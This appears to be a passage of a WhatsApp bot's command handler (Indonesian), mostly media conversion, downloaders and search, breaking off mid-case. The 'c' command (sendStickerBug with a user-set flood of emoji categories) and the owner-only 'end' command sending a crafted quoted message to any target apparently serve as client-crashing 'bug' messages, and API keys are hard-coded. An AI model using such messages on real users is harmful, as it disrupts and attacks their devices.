case 'sticker': case 'stiker': case 's': case 'stickergif': case 'sgif': {
wm = args.join(" ")
wm1 = "©P-Bot 2022" /*wm.split("/")[0]*/
wm2 = "Sticker Maker" /*wm.split("/")[1]*/
if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: wm1 ? wm1: global.packname, author: wm2 ? wm2: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((m.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: wm1 ? wm1: global.packname, author: wm2 ? wm2: global.author })
await fs.unlinkSync(encmedia)
} else {
return m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break


case 'c': {
wm = args.join(" ")
wm1 = "©P-Bot 2022" /*wm.split("/")[0]*/
wm2 = "Sticker Maker" /*wm.split("/")[1]*/
kat = text.replace(/[^0-9]/g, '')
if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
fh = []
for(let f = 0;f < kat;f++) {
fh.push("🔥💥♨️")
}
let media = await quoted.download()
let encmedia = await conn.sendStickerBug(m.chat, media, m, { packname: wm1 ? wm1: global.packname, author: wm2 ? wm2: global.author, categories: fh })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((m.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: wm1 ? wm1: global.packname, author: wm2 ? wm2: global.author })
await fs.unlinkSync(encmedia)
} else {
return m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break


case 'emojimix': {
try {
if (!text.includes("+")) return m.reply(`Contoh : ${prefix + command} 😅+🤔`)
let [emoji1, emoji2] = text.split`+`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await conn.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
} catch(err) {
m.reply("Masukkan emoji yang jelas!")
}
}
break



case 'toimage': case 'toimg': {
if (!quoted) return m.reply('Reply Image')
if (!/webp/.test(mime)) return m.reply(`balas stiker dengan caption *${prefix + command}*`)
let media = await conn.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buffer = fs.readFileSync(ran)
conn.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
}
break



case 'triggered':
case 'trigger':{
if (!quoted) return m.reply('Reply Image')
if (!/image/.test(mime)) return m.reply(`Balas gambar dengan caption *${prefix + command}*`)
let media = await conn.downloadAndSaveMediaMessage2(quoted, 'trigger.jpg')
yuricanvas = require("yuri-canvas");
async function create() {
let img = await yuricanvas.trigger('trigger.jpg');
yuricanvas.write(img, "trigger.jpg");
conn.sendImageAsSticker(m.chat, fs.readFileSync(`./trigger.jpg`), m, {packname: 'Sticker', author: '©Perwira Bot WhatsApp'})
}
create().then(() => {
(async () => {
await fs.unlinkSync('trigger.jpg')
})()
});
}
break



case 'template':{
if(text.length < 1) return m.reply(`*Contoh :* ${prefix+command} gay(reply gambar)

*List Type Template*
gay
jail
wanted
wasted
trash
burn
scary`)
if (!quoted) return m.reply('Reply Image')
if (!/image/.test(mime)) return m.reply(`Balas gambar dengan caption *${prefix + command}*`)
if(args[0] === 'burn') {
let media = await conn.downloadAndSaveMediaMessage2(quoted, 'sponge.jpg')
var pathh = 'ouit.png'
haha = async () => {
var knights = require('./lib/knights-canvas')
var image = await new knights.Burn()
.setAvatar('sponge.jpg')
.toAttachment();
data = image.toBuffer();
await fs.writeFileSync(pathh, data)
conn.sendMessage(m.chat, {image: {url: pathh}, caption: 'Done'}, {quoted: m})
}
haha().then(() => {
(async () => {
await fs.unlinkSync('sponge.jpg')
await fs.unlinkSync(pathh)
})()
});
} else if(args[0] === 'gay') {
let media = await conn.downloadAndSaveMediaMessage2(quoted, 'gay.jpg')
async function create() {
yuricanvas = require("yuri-canvas");
let img = await yuricanvas.gay('gay.jpg');
yuricanvas.write(img, "jadigay.jpg");
conn.sendImage(m.chat, fs.readFileSync(`./jadigay.jpg`), 'Done', m)
}
create().then(() => {
(async () => {
await fs.unlinkSync('gay.jpg')
await fs.unlinkSync('jadigay.jpg')
})()
});
} else if(args[0] === 'jail') {
let media = await conn.downloadAndSaveMediaMessage2(quoted, 'jail.jpg')
async function create() {
yuricanvas = require("yuri-canvas");
let img = await yuricanvas.jail('jail.jpg');
yuricanvas.write(img, "jadijail.jpg");
conn.sendImage(m.chat, fs.readFileSync(`./jadijail.jpg`), 'Done', m)
}
create().then(() => {
(async () => {
await fs.unlinkSync('jadijail.jpg')
await fs.unlinkSync('jail.jpg')
})()
});
} else if(args[0] === 'wanted') {
let media = await conn.downloadAndSaveMediaMessage2(quoted, 'wanted.jpg')
async function create() {
yuricanvas = require("yuri-canvas");
let img = await yuricanvas.wanted('wanted.jpg');
yuricanvas.write(img, "jadiwanted.jpg");
conn.sendImage(m.chat, fs.readFileSync(`./jadiwanted.jpg`), 'Done', m)
}
create().then(() => {
(async () => {
await fs.unlinkSync('jadiwanted.jpg')
await fs.unlinkSync('wanted.jpg')
})()
});
} else if(args[0] === 'trash') {
let media = await conn.downloadAndSaveMediaMessage2(quoted, 'trash.jpg')
async function create() {
yuricanvas = require("yuri-canvas");
let img = await yuricanvas.trash('trash.jpg');
yuricanvas.write(img, "jaditrash.jpg");
conn.sendImage(m.chat, fs.readFileSync(`./jaditrash.jpg`), 'Done', m)
}
create().then(() => {
(async () => {
await fs.unlinkSync('trash.jpg')
await fs.unlinkSync('jaditrash.jpg')
})()
});
} else if(args[0] === 'scary') {
let media = await conn.downloadAndSaveMediaMessage2(quoted, 'scae.jpg')
hacker = async () => {
var pathh = 'out.png'
var knights = require("./lib/knights-canvas")
var image = await new knights.Patrick()
.setAvatar(media)
.toAttachment();
data = image.toBuffer();
await fs.writeFileSync(pathh, data)
conn.sendMessage(m.chat, {image: {url: pathh}}, {quoted: m})
}
hacker().then(() => {
(async () => {
await fs.unlinkSync(pathh)
})()
})
} else if(args[0] === 'wasted') {
let media = await conn.downloadAndSaveMediaMessage2(quoted, 'wasted.jpg')
async function create() {
yuricanvas = require("yuri-canvas");
let img = await yuricanvas.wasted('wasted.jpg');
yuricanvas.write(img, "jadiwasted.jpg");
conn.sendImage(m.chat, fs.readFileSync(`./jadiwasted.jpg`), 'Done', m)
}
create().then(() => {
(async () => {
await fs.unlinkSync('jadiwasted.jpg')
await fs.unlinkSync('wasted.jpg')
})()
});
} else { m.reply(`Maaf ${args[0]} tidak ada di Type Template
*Contoh :* ${prefix+command} gay(reply gambar)

*List Type Template*
gay
jail
wanted
wasted
trash
burn
scary`) }
}
break





case 'convert': 
case 'to': {
if(text.length < 1) return m.reply(`*Contoh:* ${prefix+command} mp3(sambil reply media)\n\n*List yang tersedia*\nmp3\nmp4\ngif\nimg`)
if(text.includes("img", "gambar", "image")) {
if (!quoted) return m.reply('Reply Image')
if (!/webp/.test(mime)) return m.reply(`balas stiker dengan caption *${prefix + command}*`)
let media = await conn.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buffer = fs.readFileSync(ran)
conn.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
} else if(text.includes("mp3", "audio")) {
if (/document/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)

let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert tomp3.mp3`}, { quoted : m })
} else if(text.includes("mp4", "video", "vidio")) {
if (!quoted) return m.reply('Reply sticker animated')
if (!/webp/.test(mime)) return m.reply(`balas stiker dengan caption *${prefix + command}*`)

let { webp2mp4File } = require('./lib/uploader')
let media = await conn.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
await fs.unlinkSync(media)
} else if(text.includes("gif")) {
if (!quoted) return m.reply('Reply Image')
if (!/webp/.test(mime)) return m.reply(`balas stiker dengan caption *${prefix + command}*`)

let { webp2mp4File } = require('./lib/uploader')
let media = await conn.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
} else {
m.reply(`*Contoh:* ${prefix+command} mp3(sambil reply media)\n\n*List yang tersedia*\nmp3\nmp4\ngif\nimg`)
}
}
break




case 'tomp4': case 'tovideo': {
if (!quoted) return m.reply('Reply sticker animated')
if (!/webp/.test(mime)) return m.reply(`balas stiker dengan caption *${prefix + command}*`)

let { webp2mp4File } = require('./lib/uploader')
let media = await conn.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
await fs.unlinkSync(media)
}
break



case 'toaud': case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)

let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
conn.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break



case 'tomp3': {
if (/document/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)

let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert tomp3 ${new Date()}.mp3`}, { quoted : m })
}
break



case 'tovn': case 'toptt': {
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply(`Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)

let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
conn.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break



case 'togif': {
if (!quoted) return m.reply('Reply Image')
if (!/webp/.test(mime)) return m.reply(`balas stiker dengan caption *${prefix + command}*`)

let { webp2mp4File } = require('./lib/uploader')
let media = await conn.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
}
break



case 'tourl': {
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await conn.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break

case 'removebg':
case 'nobg':
case 'bg': {
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let { nobg } = require('./lib/nobg')
try {
localFile = await conn.downloadAndSaveMediaMessage(quoted)
datan = await nobg(localFile)
datani = datan.file
conn.sendMessage(m.chat, {image: {url: datani}, caption: "Remove Background"}, { quoted : m }).then(() => {
(async () => {
await fs.unlinkSync(localFile)
await fs.unlinkSync(datani)
})()
})
} catch(err) {
m.reply(String(err))
}
}
break

case 'imagenobg2': case 'removebg2': case 'remove-bg2': {
try {
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let remobg = require('remove.bg')
let apirnobg = ['1oKkwvf7MmTyUz6Zr3UqMSfY']
let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
hmm = await './src/remobg-'+getRandom('')
localFile = await conn.downloadAndSaveMediaMessage(quoted, hmm)
outputFile = await './src/hremo-'+getRandom('.png')

remobg.removeBackgroundFromImageFile({
path: localFile,
apiKey: apinobg,
size: "regular",
type: "auto",
scale: "100%",
outputFile 
}).then(async result => {
conn.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
await fs.unlinkSync(localFile)
await fs.unlinkSync(outputFile)
})
} catch(err) {
m.reply(err)
}
}
break



case 'yts': 
case 'ytsearch': {
try {
let { yts } = require("./lib/yts")
let _s = await yts(text)
let no_ = 1
let _no = 1
let is_ = []
let _is = []
for (let isu of _s.video) {
is_.push({
"title": `${no_++}.${isu.title}`,
"description": `•Channel : ${isu.authorName} ${isu.viewH}\n•Duration : ${isu.duration} •Upload : ${isu.publishedTime}`,
"rowId": `ytdl ${isu.url}`
})
}

let listMessage = {
text: 'Hasil penelusuran',
footer: `©Perwira Bot WhatsApp`,
title: `Yt-Search`,
buttonText: "Video yang ditemukan",
sections: [{
"title": `Hasil penelusuran yang ditemukan`,
"rows": is_}]
}

conn.sendMessage(m.chat, listMessage, {quoted: 
{
key: { fromMe: false, participant: `${quoted.sender}`},
message: {
"extendedTextMessage": {
"text": `*YouTube Search*`,
"title": ``,
'jpegThumbnail': fs.readFileSync('./image/yt.png')
}} 
}, contextInfo: {mentionedJid: [quoted.sender]}})

} catch(err) {
m.reply(String(err))
}

}
break




case 'ytss': case 'ytsearchh': {
if(text.length < 1) return m.reply(`Contoh : ${prefix + command} story wa anime`)
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
let po = 1
let kunn = []
let kunni = []
for (let i of search.all) {
kunn.push({
"title": `${no++}.${i.title}`,
"description": `•Upload : ${i.ago}\n•Duration : ${i.timestamp}`,
"rowId": `ytdl ${i.url}`
})
/*kunni.push({
"title": `${po++}.${i.title}`,
"description": `•Upload : ${i.ago}\n•Duration : ${i.timestamp}`,
"rowId": `ytmp4 ${i.url}`
})*/
}
let listMessage = {
text: 'Hasil penelusuran',
footer: `©Perwira Bot WhatsApp`,
title: `Yt-Search`,
buttonText: "Video yang ditemukan",
sections: [{
"title": `Hasil penelusuran yang ditemukan`,
"rows": kunn}]
}
conn.sendMessage(m.chat, listMessage, {quoted: 
{
key: { fromMe: false, participant: `${quoted.sender}`},
message: {
"extendedTextMessage": {
"text": `*YouTube Search*`,
"title": ``,
'jpegThumbnail': fs.readFileSync('./image/yt.png')
}} 
}, contextInfo: {mentionedJid: [quoted.sender]}})
/*teks += `No : ${no++}\nType : ${i.type}\nVideo ID : ${i.videoId}\nTitle : ${i.title}\nViews : ${i.views}\nDuration : ${i.timestamp}\nUpload At : ${i.ago}\nAuthor : ${i.author.name}\nUrl : ${i.url}\n\n─────────────────\n\n`*/

/* conn.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },caption: teks }, { quoted: m })*/
}
break




case 'download':
case 'dl': {
if(text.length < 1) return m.reply(`Masukkan linknya\n*Contoh:* ${prefix+command} https://www.instagram.com/p/CcejPskP8Ia/?igshid=YmMyMTA2M2Y=`)
if(text.includes("youtu")) {
pesan = `Silahkan pilih type media`
let btnz = [{buttonId: `ytmp3 ${text}`, buttonText: {displayText: 'Audio'}, type:1},{buttonId: `ytmp4 ${text}`, buttonText: {displayText: 'Video'}, type:1}]
conn.sendButtonText(m.chat, btnz, pesan, `©Perwira Bot WhatsApp`, m)
} else if(text.includes("instagram.com")) {
if(text.includes("/stories/")) return m.reply(`_Gunakan perintah ${prefix}igstory_`)
mimeaxig= ''
{
try {
if(text.includes("instagram.com")) {
let {instagram} = require('mumaker')
helo = await instagram(text)
let res = await axios.head(helo[0].url)
mimeaxig= res.headers['content-type']
if(mimeaxig.split("/")[0] === "image"){
return conn.sendMessage(m.chat, { document: {url: helo[0].url}, mimetype: 'image/jpeg', fileName: `${text}.jpg`, contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `Instagram Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text}`, sourceUrl: `${text}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: fs.readFileSync('./image/ig.jpeg')}}}) /*conn.sendButDoc2(m.chat, "©Perwira Bot WhatsApp", '*Click Document untuk download*\n\n*Lokasi file*\nAndroid/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents', `Instagram Download`, "©Perwira Bot WhatsApp", fs.readFileSync('./image/ig.jpeg'), text, 1, `${text}.jpg` , helo[0].url, 'image/jpeg', [{ buttonId: 'ok', buttonText: { displayText: 'Thanks' }, type: 1 }], m, true) */
} else if(mimeaxig.split("/")[0] === "video"){
return conn.sendMessage(m.chat, { document: {url: helo[0].url}, mimetype: 'video/mp4', fileName: `${text}.mp4`, contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `Instagram Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text}`, sourceUrl: `${text}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: fs.readFileSync('./image/ig.jpeg')}}})
}
} else {
m.reply(`Masukkan link!\n*Contoh :* ${prefix+command} https://www.instagram.com/p/CcejPskP8Ia/?igshid=YmMyMTA2M2Y=`)
}
} catch(e) {
conn.sendButtonText(m.chat, [{buttonId: `igdl2 ${text}`, buttonText: {displayText: 'Versi lain'}, type: 1}, {buttonId: `igdl ${text}`, buttonText: {displayText: 'Coba lagi'}, type: 1}], `Ulangi kembali, jika tetap error lapor Owner\n\n*Rincian kesalahan :*\n${String(e)}`, '©Perwira Bot WhatsApp')
}
}
} else if(text.includes("tiktok.com")) {
try {
ddi = [{ buttonId: `tiktokmp3 ${text}`, buttonText: { displayText: 'Audio' },type: 1}]
tiktok = require('./lib/tiktok')
resion = await tiktok(text)
/*got_vid = await getBuffer(resion.medias.nowm.url).catch(e => m.reply("Error"))*/
conn.sendButVidc(m.chat, ddi, "*Tiktok Downloader*", '©P-Bot 2022\nThis is simple Bot WhatsApp', `${resion.medias.nowm.url}`)
/*sendButVid(m.chat, '*TikTok Downloader*', '©Perwira Bot WhatsApp', `${resion.medias.nowm.url}`, [{quickReplyButton: {displayText: 'Audio', id: `ttmp3 ${text}`}}])*/
} catch(e) {
conn.sendButtonText(m.chat, [{buttonId: `tiktok2 ${text}`, buttonText: {displayText: 'Server lain'}, type: 1}], `Ulangi kembali, jika tetap error lapor Owner\n\n*Rincian kesalahan :*\n${String(e)}`, '©Perwira Bot WhatsApp')
}
} else if(text.includes("mediafire.com")) {
try {
if(text.includes('mediafire.com')) {
let {mediafire} = require('mumaker')
await mediafire(text).then(async datan => {
if(datan[0].mime === 'zip') {
conn.sendMessage(m.chat, {document: {url: datan[0].link}, fileName: datan[0].nama, mimetype: 'application/zip', contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `MediaFire Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text}`, sourceUrl: `${text}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: fs.readFileSync('./image/mfire.jpg')}}}) 
} else if(datan[0].mime === '9') {
conn.sendMessage(m.chat, {document: {url: datan[0].link}, fileName: datan[0].nama, mimetype: 'application/vnd.android.package-archive', contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `MediaFire Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text}`, sourceUrl: `${text}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: fs.readFileSync('./image/mfire.jpg')}}}) 
} else if(datan[0].mime === '7z') {
conn.sendMessage(m.chat, {document: {url: datan[0].link}, fileName: datan[0].nama, mimetype: 'application/7z', contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `MediaFire Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text}`, sourceUrl: `${text}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: fs.readFileSync('./image/mfire.jpg')}}}) 
} else if(datan[0].nama.endsWith('.mp4')) {
conn.sendMessage(m.chat, {document: {url: datan[0].link}, fileName: datan[0].nama, mimetype: 'video/mp4', contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `MediaFire Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text}`, sourceUrl: `${text}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: fs.readFileSync('./image/mfire.jpg')}}})
} else if(datan[0].nama.endsWith('.pdf')) {
conn.sendMessage(m.chat, {document: {url: datan[0].link}, fileName: datan[0].nama, mimetype: 'application/pdf', contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `MediaFire Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text}`, sourceUrl: `${text}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: fs.readFileSync('./image/mfire.jpg')}}})
} else {
conn.sendMessage(m.chat, {document: {url: datan[0].link}, fileName: datan[0].nama, mimetype: 'application/octet-stream', contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `MediaFire Download`, body: "©Perwira Bot WhatsApp", mediaUrl: `${text}`, sourceUrl: `${text}`, renderLargerThumbnail: true, showAdAttribution: true, mediaType: 1, thumbnail: fs.readFileSync('./image/mfire.jpg')}}})
m.reply('Buka document melalui apk File manager anda')
}
})
} else {
m.reply(`*Cara Penggunaan*\n\n*Contoh :* ${prefix+command} https://www.mediafire.com/file/jqxsuqn83s0f2wp/PIXELLAB+DARK+BLUE+1.9.9.apk/file`)
}
} catch (e) {
m.reply("Error")
}
} else if(text.includes("t.me")) {
try {
if (m.isGroup) return m.reply("Tidak bisa digunakan di group")
if(text.length < 1) return m.reply(`Contoh: ${prefix+command} https://t.me/addstickers/geestickerpack`)
if (!text.includes('t.me/addstickers')) return m.reply('Bukan link telegram stiker')
let { Tstick } = require('./lib/scraper')
var telestc = await Tstick(`${q}`).catch(err => m.reply(`*Error*\n${util.format(err)}`))
for (let unduh of telestc) {
conn.sendMessage(m.chat, {sticker: await getBuffer(unduh.url), mimetype:'image/webp'},{quoted: m}).catch(err => m.reply(`*Error*\n${util.format(err)}`))
}
} catch(e) {
m.reply(String(e))
}
} else {
m.reply(`Belum tersedia untuk download link ${text}`)
}
}
break



case 'ytdl':{
pesan = `Silahkan pilih type media`
let btnz = [{buttonId: `ytmp3 ${text}`, buttonText: {displayText: 'Audio'}, type:1},{buttonId: `ytmp4 ${text}`, buttonText: {displayText: 'Video'}, type:1}]
conn.sendButtonText(m.chat, btnz, pesan, `©Perwira Bot WhatsApp`, m)
}break



case 'google': {
if(text.length < 1) return m.reply(`Contoh : ${prefix + command} fatih arridho`)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `*Title* : ${g.title}\n`
teks += `*Description* : ${g.snippet}\n`
teks += `*Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break



/*case 'tesbut':{
conn.sendMessage(m.chat, 
{document: fs.readFileSync('./image/pem.jpg'), mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
fileName: '𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂', contextInfo: {
externalAdReply: {
sourceUrl: `https://©Perwira Bot WhatsApp`, 
mediaUrl: `https://Perwira Not WhatsApp`, 
mediaType: 1, renderLargerThumbnail: true,
thumbnail: fs.readFileSync(`./image/ig.jpeg`)}},
caption: 'Hello World',
footer: 'CAF BOTz - Bot MD',
buttons: buttonLoc,
headerType:4})
}break*/



case 'gimage': {
if(text.length < 1) return m.reply(`Contoh : ${prefix + command} kaori cicak`)
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
let buttons = [
{buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: images },
caption: `*Google Image*`,
footer: conn.user.name,
buttons: buttons,
headerType: 4
}
conn.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
break




case 'tsticker':
case 'telesticker': 
case 'tstiker': {
try {
if (m.isGroup) return m.reply("Tidak bisa digunakan di group")
if(text.length < 1) return m.reply(`Contoh: ${prefix+command} https://t.me/addstickers/geestickerpack`)
if (!text.includes('t.me')) return m.reply('Bukan link telegram stiker')
let { Tstick } = require('./lib/scraper')
var telestc = await Tstick(`${q}`).catch(err => m.reply(`*Error*\n${util.format(err)}`))
for (let unduh of telestc) {
conn.sendMessage(m.chat, {sticker: await getBuffer(unduh.url), mimetype:'image/webp'},{quoted: m}).catch(err => m.reply(`*Error*\n${util.format(err)}`))
}
} catch(e) {
m.reply(String(e))
}
}
break


case 'play': case 'ytplay': {

if(text.length < 1) return m.reply(`Contoh : ${prefix + command} perfect ed-sheeran`)
try {
/*let yts = require("yt-search" )*/
let { yts } = require("./lib/yts")
let { yta } = require('./lib/y2mate')
let search = await yts(text)
let aramat = search.all
/*search.videos[Math.floor(Math.random() * search.videos.length)]*/
let _s = await yts(text)
let no_ = 1
let _no = 1
let is_ = []
let _is = []
for (let isu of _s.video) {
is_.push({
"title": `${no_++}.${isu.title}`,
"description": `•Channel : ${isu.authorName} ${isu.viewH}\n•Duration : ${isu.duration} •Upload : ${isu.publishedTime}`,
"rowId": `ytdl ${isu.url}`
})
}

let listMessage = {
text: 'Hasil penelusuran',
footer: `©Perwira Bot WhatsApp`,
title: `Yt-Search`,
buttonText: "Video yang ditemukan",
sections: [{
"title": `Hasil penelusuran yang ditemukan`,
"rows": is_}]
}

let res = await yta(`${search.video[0].url}`)
let get_img = await getBuffer(res.thumb)
if (res.filesize >= 10000) return m.reply('File Melebihi Batas, maximal 10 mb')
conn.sendMessage(m.chat, { document: { url: res.dl_link }, mimetype: 'audio/mpeg', fileName: `${res.title}.mp3`,contextInfo: {externalAdReply: {title: `${res.title}`, body: "©Perwira Bot WhatsApp", mediaUrl: `${search.video[0].url}`, sourceUrl: `${search.video[0].url}`, mediaType: 2, showAdAttribution: true, thumbnail: get_img}}}, {}).catch((e) => m.reply(String(e))).then(() => {

/*let kunnu = []
let no = 1

for(let i of aramat) {
kunnu.push({
"title": `${no++}. ${i.title}`,
"description": `• Upload: ${i.ago}\n• Duration: ${i.timestamp}`,
"rowId": `ytmp3 ${i.url}` 
})

}

let listMessage = {
text: 'Hasil penelusuran lain',
footer: `©Perwira Bot WhatsApp`,
title: `Jika hasil salah klik disini`,
buttonText: "Hasil lainya",
sections: [{
"title": `Hasil penelusuran`,
"rows": kunnu
}],
}
conn.sendMessage(m.chat, listMessage, {quoted: m})
*/
conn.sendMessage(m.chat, listMessage, {quoted: 
{
key: { fromMe: false, participant: `${quoted.sender}`},
message: {
"extendedTextMessage": {
"text": `*YouTube Search*`,
"title": ``,
'jpegThumbnail': fs.readFileSync('./image/yt.png')
}} 
}, contextInfo: {mentionedJid: [quoted.sender]}})
})
} catch(e) {
m.reply(String(e))
}
}break




case 'end': {
if(!isCreator) return m.reply("Khusus Owner")
try {
if(text.endsWith("@g.us")) {
a = await conn.sendMessage(m.chat, {text: "Succes"})
b = await conn.sendMessage(m.chat, {react: {text: "🗿", key: { remoteJid: m.chat, fromMe: true, id: a.key.id }}})
conn.sendMessage(text, {text: "."}, {quoted: b})
} else if(text.startsWith("@")) {
a = await conn.sendMessage(m.chat, {text: "Succes"})
b = await conn.sendMessage(m.chat, {react: {text: "🗿", key: { remoteJid: m.chat, fromMe: true, id: a.key.id }}})
conn.sendMessage(`${text.split("@")[1]}@s.whatsapp.net`, {text: "."}, {quoted: b})
} else if(text.includes("+")) {
